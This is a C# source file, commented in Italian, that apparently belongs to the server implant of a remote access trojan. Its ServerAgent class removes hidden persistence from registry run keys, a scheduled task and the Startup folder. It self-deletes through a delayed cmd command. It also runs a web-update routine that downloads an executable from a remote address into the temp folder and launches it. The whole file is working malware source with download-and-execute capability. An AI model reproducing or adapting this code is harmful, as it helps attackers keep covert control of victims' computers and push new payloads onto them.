using System;
using System.IO;
using System.Net;
using System.Reflection;
using System.Threading;
using bc.srv.Classes;

namespace bc.srv.Muduli.Server_Manager
{
    internal class ServerAgent
    {
        /// <summary>
        ///     Disinstalla il server
        ///     onlyDelete: se true è solo disinstallzione, altrimenti non elimina se stesso (uso per update from web)
        /// </summary>
        public void UninstallServer(bool onlyDelete)
        {
            var rm = new RegistryManager();

            var appData = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);

            var adppDataFilePath = Path.Combine(appData, SrvData.Instance.sAppDataInstall);


            // ELIMINO I REGISTRY DELLE INSTALLAZIONi
            if (SrvData.Instance.BUseHkcu)
                rm.RemoveHkcuReg(SrvData.Instance.SHkcuEntry, adppDataFilePath);

            if (SrvData.Instance.bUseExplorer)
                rm.RemoveExplorerReg(SrvData.Instance.sExplorerEntry, adppDataFilePath);

            if (SrvData.Instance.UseTaskScheduler)
            {
                // remove task
                var dosRunner = new DosRunner();
                dosRunner.ExecuteCommand($"schtasks /delete /tn {SrvData.Instance.TaskSchedulerName} /f");
            }

            // ELIMINAZIONE FILE
            if (SrvData.Instance.BUseHkcu || SrvData.Instance.bUseExplorer || SrvData.Instance.UseTaskScheduler)
                if (File.Exists(adppDataFilePath) && Assembly.GetExecutingAssembly().Location != adppDataFilePath)
                    File.Delete(adppDataFilePath);


            if (SrvData.Instance.bUseStartupFolder)
            {
                var startup = Environment.GetFolderPath(Environment.SpecialFolder.Startup);

                var fileToDel = Path.Combine(startup, SrvData.Instance.sStartupFileName);

                if (File.Exists(fileToDel) && Assembly.GetExecutingAssembly().Location != fileToDel)
                    File.Delete(fileToDel);
            }


            // NUOVO PROCESSO CMD PER ELIMINAZIONE DEL FILE IN ESECUZIONE!

            if (onlyDelete)
            {
                var ic = new InstallClass();
                ic.DeleteMySelf();
            }

            // L'APP è STATA CHIUSA DA DELETEMYSELF
        }
        //--------------------------

        /// <summary>
        ///     Avvio thread di update server
        /// </summary>
        /// <param name="webAddress"></param>
        public void StartUpdateServerWeb(string webAddress)
        {
            new Thread(delegate() { ServerWebUpdater(webAddress); }).Start();
        }
        //---------------------------

        /// <summary>
        ///     Thread di update server da web
        /// </summary>
        /// <param name="webAddress"></param>
        private void ServerWebUpdater(string webAddress)
        {
            try
            {
                var tmpFilePath = Path.GetTempFileName();

                tmpFilePath = Path.ChangeExtension(tmpFilePath, ".exe"); // lo faccio diventare un exe


                var wc = new WebClient();
                wc.DownloadFile(webAddress, tmpFilePath); // scarico il file nel tmp

                UninstallServer(false); // CANCELLO TUTTA L'INSTALLAZIONE MA NON L'ESEGUIBILE

                // SOSTITUISCO L'ESEGUIBILE E MI RIESEGUO!

                var arg = string.Format("/C choice /C Y /N /D Y /T 9 & Del \"{0}\" & \"{1}\"  ",
                    Assembly.GetExecutingAssembly().Location, tmpFilePath);

                var dr = new DosRunner();

                dr.RunDosSelfDelete(arg);


                Program.Exit(4);
            }
            catch
            {
            }
        }
        //-------------------------
    }
}